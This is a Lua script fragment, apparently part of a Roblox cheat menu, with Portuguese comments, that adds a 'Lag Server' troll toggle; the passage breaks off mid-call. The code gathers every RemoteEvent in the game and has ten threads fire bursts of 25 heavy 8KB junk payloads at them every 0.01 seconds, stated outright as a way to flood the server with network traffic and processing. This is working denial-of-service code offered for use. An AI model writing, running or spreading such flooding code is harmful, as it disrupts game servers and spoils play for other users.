-- ========= LAG SERVER (Troll) =========
-- Baseado no DeepHat Brutal Network Saturation (High Intensity Burst Mode), sem interface

-- Configurações de poder
LAG_BURST_COUNT = 25      -- Quantos pacotes por rajada
LAG_THREAD_STRENGTH = 10  -- Threads simultâneas
LAG_PAYLOAD_SIZE = 8000   -- Tamanho do pacote (dados pesados)
LAG_REFRESH_RATE = 0.01   -- Delay mínimo entre rajadas

lagServerEnabled = false
lagServerThreads = {}
lagServerToggleApi = nil
lagServerPayloadData = string.rep("Z", LAG_PAYLOAD_SIZE) .. os.clock() -- Payload massivo pré-calculado

function lagServerGetRemotes()
	local remotes = {}
	for _, v in pairs(ReplicatedStorage:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			table.insert(remotes, v)
		end
	end
	return remotes
end

-- Função de disparo de rajada (burst)
function lagServerExecuteBurst(remotes)
	while lagServerEnabled do
		local target = remotes[math.random(1, #remotes)]

		if target then
			-- Loop de rajada: dispara varios pacotes de uma vez so
			for i = 1, LAG_BURST_COUNT do
				pcall(function()
					target:FireServer(lagServerPayloadData, i, "BRUTE_FORCE", math.random(), "STRESS")
				end)
			end
		end

		-- Delay mínimo para nao travar o SEU cliente completamente
		task.wait(LAG_REFRESH_RATE)
	end
end

function lagServerStop()
	lagServerEnabled = false
	for _, thread in ipairs(lagServerThreads) do
		task.cancel(thread)
	end
	lagServerThreads = {}
end

lagServerToggle = createToggle(trollCategory, "Lag Server", function(enabled)
	pcall(function()
		if enabled then
			local remotes = lagServerGetRemotes()
			if #remotes == 0 then
				lagServerEnabled = false
				showMenuToast("Lag Server", "Nenhum Remote encontrado! Verifique o ambiente.", Color3.fromRGB(255, 170, 70))
				if lagServerToggleApi and lagServerToggleApi.setState then
					lagServerToggleApi.setState(false)
				end
				return
			end

			lagServerEnabled = true
			lagServerThreads = {}
			for _ = 1, LAG_THREAD_STRENGTH do
				table.insert(lagServerThreads, task.spawn(function()
					lagServerExecuteBurst(remotes)
				end))
			end
			showMenuToast("Lag Server", "Saturacao brutal ativa (" .. LAG_THREAD_STRENGTH .. " threads, burst " .. LAG_BURST_COUNT .. ")", Color3.fromRGB(255, 100, 100))
		else
			lagServerStop()
		end
	end)
end, "Saturacao brutal de rede estilo DeepHat: 10 threads disparando rajadas de 25 pacotes pesados (8KB) em RemoteEvents a cada 0.01s. Enche o servidor de trafego e processamento de rede. Task.wait() mantem o FPS local estavel.", {
	bindId = "lagserver",
	getBindValue = function() return lagServerBind end,
